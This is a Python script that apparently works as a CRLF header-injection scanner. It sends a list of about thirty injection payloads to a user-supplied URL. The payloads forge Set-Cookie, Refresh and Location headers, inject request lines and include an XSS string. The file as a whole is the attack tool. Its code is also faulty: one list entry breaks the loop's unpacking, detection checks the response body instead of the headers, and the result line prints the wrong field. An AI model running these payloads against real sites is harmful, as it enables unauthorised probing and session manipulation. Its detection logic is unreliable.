import requests

# Function to test for CRLF injection vulnerabilities
def test_crlf_injection(target_url, payload, payload_name):
    try:
        response = requests.post(target_url, data=payload)
        if "maliciousCookie=maliciousValue" in response.text or \
                "Refresh: 0" in response.text or \
                "Content-Length: 0" in response.text or \
                "Location: https://www.bbc.com" in response.text:
            print(f"Vulnerable to CRLF Injection: {payload_name} - {payload}")
            return "high"
        else:
            print(f"Not vulnerable to CRLF Injection: {payload_name} - {payload}")
            return "low"
    except Exception as e:
        print(f"Error occurred while testing: {str(e)}")
        return "medium"

# Main function to run the CRLF injection test
def run_crlf_injection_test():
    # Prompt user for the target URL
    target_url = input("Enter your target URL: ")

    # Define payloads and their variable names
    PAYLOADS = [
        ("CRLF1", "username=test%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A&password=test"),
        ("CRLF2", "username=test%0D%0AContent-Length:%200%0D%0A&password=test"),
        ("CRLF3", "username=test%0D%0ARefresh:%200%0D%0A&password=test"),
        ("CRLF4", "username=test%0D%0ALocation:%20https://www.bbc.com%0D%0A&password=test"),
        ("CRLF5", "User-Agent:%20Malicious%0D%0Ausername=test&password=test"),
        ("CRLF6", "Referer:%20https://www.bbc.com%0D%0Ausername=test&password=test"),
        ("CRLF7", "Proxy:%20https://www.bbc.com%0D%0Ausername=test&password=test"),
        ("CRLF7.5", "http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue"),
        ("CRLF8", "Set-Cookie2:%20maliciousCookie=maliciousValue%0D%0Ausername=test&password=test"),
        ("CRLF9", "CustomHeader:%20Injection%0D%0Ausername=test&password=test"),
        ("CRLF10", "POST /login%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0A%0D%0A"),
        ("CRLF11", "POST /login HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0A"),
        ("CRLF12", "Content-Type: text/html%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test&password=test"),
        ("CRLF13", "<!--%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A-->"),
        ("CRLF14", "username=test%0D%0AUser-Agent:%20Malicious%0D%0A&password=test"),
        ("CRLF15", "username=test%0D%0AReferer:%20https://www.bbc.com%0D%0A&password=test"),
        ("CRLF16", "username=test%0D%0AProxy:%20https://www.bbc.com%0D%0A&password=test"),
        ("CRLF17", "username=test%0D%0ASet-Cookie2:%20maliciousCookie=maliciousValue%0D%0A&password=test"),
        ("CRLF18", "username=test%0D%0ACustomHeader:%20Injection%0D%0A&password=test"),
        ("CRLF19", "POST /login%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0A%0D%0A&password=test"),
        ("CRLF20", "POST /login HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0A&password=test"),
        ("CRLF21", "Content-Type: text/html%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test"),
        ("CRLF22", "<!--%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A-->&password=test"),
        ("CRLF23", "User-Agent:%20Malicious%0D%0A&password=test"),
        ("CRLF24", "Referer:%20https://www.bbc.com%0D%0A&password=test"),
        ("CRLF25", "Proxy:%20https://www.bbc.com%0D%0A&password=test"),
        ("CRLF26", "Set-Cookie2:%20maliciousCookie=maliciousValue%0D%0A&password=test"),
        ("CRLF27", "CustomHeader:%20Injection%0D%0A&password=test"),
        ("CRLF28", "POST /login%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0A%0D%0A&password=test"),
        ("CRLF29", "POST /login HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0A&password=test"),
        ("CRLF30", "Content-Type: text/html%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test&password=test"),
        ("<script>alert(1)</script>%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A&password=test")
    ]

    # Test each payload
    successful_payload = None
    successful_metric = None
    for payload_name, payload in PAYLOADS:
        metric = test_crlf_injection(target_url, payload, payload_name)
        if metric == "high":
            successful_payload = payload
            successful_metric = metric

    # Print the successfully injected payload and its variable name with respective metric
    if successful_payload:
        print(f"Successful CRLF Injection: Payload - {successful_payload}, Variable Name - {successful_payload}, Metric - {successful_metric}")
    else:
        print("No successful injection found.")

# Execute the main function
if __name__ == "__main__":
    run_crlf_injection_test()
